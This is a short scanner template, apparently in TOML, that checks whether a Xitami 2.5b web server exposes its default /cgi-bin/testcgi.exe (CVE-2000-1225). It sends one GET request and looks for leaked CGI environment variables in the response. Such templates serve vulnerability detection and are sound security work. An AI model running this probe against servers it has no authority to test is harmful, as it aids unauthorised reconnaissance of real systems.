[info]
author = "AVE"
description = "检测 Xitami 2.5b Web 服务器默认安装的 /cgi-bin/testcgi.exe 是否可被远程访问并泄露敏感配置信息"
id = "POC-AVE-2000-1155"
name = "Xitami Web服务器 testcgi.exe 敏感信息泄露漏洞 PoC"
severity = "medium"
tags = ["ave-2000-1155"]
vuln_id = [
    "CVE-2000-1225",
    "AVE-2000-1155",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/testcgi.exe"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "SERVER_SOFTWARE",
    "SERVER_NAME",
    "GATEWAY_INTERFACE",
    "testcgi",
]
